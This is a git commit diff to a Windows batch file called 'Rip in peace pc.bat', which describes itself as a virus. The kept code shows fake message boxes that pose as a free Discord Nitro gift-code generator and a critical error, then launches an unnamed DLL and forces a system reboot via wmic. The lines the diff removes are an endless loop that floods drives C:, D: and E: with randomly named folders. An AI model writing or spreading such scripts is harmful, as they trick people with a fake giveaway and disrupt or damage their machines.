8f9641d0b34885c615d72ba4265f449a1c2cef95
Lol-cvm <81323182+Lol-cvm@users.noreply.github.com>
2021-05-25 19:44:05 +0300

    Update Rip in peace pc.bat

--- Rip in peace pc.bat
+++ Rip in peace pc.bat
@@ -1,19 +1,8 @@
-@echo WARNING! THIS VIRUS MIGHT DESTROY YOUR WINDOWS, PLEASE DO NUT RUN THIS ON YOUR REAL PC OR ON YOUR FRIEND'S ONE (bad joke btw) BEACUSE IT MIGHT RUIN THEIR PC
-TO CONTINUE, PRESS ANY KEY.
+@echo WARNING! THIS VIRUS MIGHT DESTROY YOUR WINDOWS, PLEASE DO NUT RUN THIS ON YOUR REAL PC OR ON YOUR FRIEND'S ONE (bad joke btw) BEACUSE IT MIGHT RUIN THEIR PC TO CONTINUE, PRESS ANY KEY.
 @echo off
 pause
 echo x=msgbox("Nitro Generator" ,0+64, "Welcome to free nitro gift codes generator 2069! Press ok to continue") >> msgbox2.vbs
 echo x=msgbox("CRITICAL ERROR" ,0+16, "Something went wrong, please press "Ok" to try agian.") >> msgbox.vbs
-:VIRUS
-cd /d C:
-md %RANDOM%
-cd /d D:
-md %RANDOM%
-cd /d E:
-md %RANDOM%
-goto VIRUS
-REM #######################
-REM errorcode401.blogspot.in
 start "rippcassist.dll"
 wmic os where primary=1 reboot
 
